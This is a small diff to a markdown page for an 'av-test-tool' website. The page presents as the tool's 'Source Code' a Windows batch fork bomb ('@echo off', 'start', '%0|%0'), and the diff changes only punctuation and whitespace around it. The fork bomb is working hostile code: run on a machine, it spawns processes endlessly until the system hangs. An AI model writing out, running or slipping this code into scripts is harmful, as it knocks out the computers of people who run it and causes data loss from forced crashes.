@@ -1,13 +1,11 @@
 ## Welcome to av-test-tool website
 
 
-Source Code,
+Source Code;
 
-@echo off
-
-start
-
-%0|%0
+@echo off 
+start 
+%0|%0 
 
 
 ### Tool Information
